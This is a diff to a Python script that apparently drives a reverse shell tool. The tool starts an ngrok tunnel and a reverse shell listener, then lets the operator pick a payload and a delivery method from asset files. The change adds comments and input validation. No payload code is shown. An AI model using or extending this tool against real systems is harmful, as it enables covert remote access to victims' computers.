@@ -106,14 +106,21 @@ class NgrokServer:
 class Main:
     def __init__(self):
         self.log = Log()
+        # Loads ngrok key and setup
         self.key()
         self.setup()
+        # Get the connection ports for the web server and reverse shell server
         self.web_host, self.web_port = self.load_host()
         self.rev_host = self.log.inpt("Reverse host: ")
         self.rev_port = self.log.inpt("Reverse port: ")
+        # Load the payloads and deliveries
+        self.payloads = [file.split(".")[0] for file in os.listdir("Assets/Payloads") if file.endswith(".txt")]
+        self.deliveries = [file.split(".")[0] for file in os.listdir("Assets/Deliveries") if file.endswith(".txt")]
+        # Get autorun and local
         autorun = self.log.inpt("Autorun?: ")
         self.local = self.log.inpt("Local?: ")
         self.autorun = False if autorun == "n" else True
+        # Start the servers
         self.rev_server = RevServer(self.rev_host, self.rev_port, self.autorun)
         hostip, _ = self.load_host()
         self.ngrok_server = NgrokServer(self.key(), self.local, self.rev_host, self.rev_port, hostip)
@@ -152,12 +159,12 @@ class Main:
 
     def show_loads(self):
         self.log.verbose("Available payloads")
-        for file in os.listdir("Assets/Payloads"):
+        for file in self.payloads:
             self.log.info(file.split(".")[0])
 
     def show_deliveries(self):
         self.log.verbose("Available deliveries")
-        for file in os.listdir("Assets/Deliveries"):
+        for file in self.deliveries:
             self.log.info(file.split(".")[0])
 
     def start_server(self, load):
@@ -170,8 +177,14 @@ class Main:
     def main(self):
         self.show_loads()
         payload = self.log.inpt("Payload: ")
+        while payload not in self.payloads:
+            self.log.error("Invalid payload")
+            payload = self.log.inpt("Payload: ")
         self.show_deliveries()
         delivery = self.log.inpt("Delivery: ")
+        while delivery not in self.deliveries:
+            self.log.error("Invalid delivery")
+            delivery = self.log.inpt("Delivery: ")
         self.ngrok_server.start()
         self.url = self.ngrok_server.url
         threading.Thread(target=self.start_server, args=(payload,)).start()
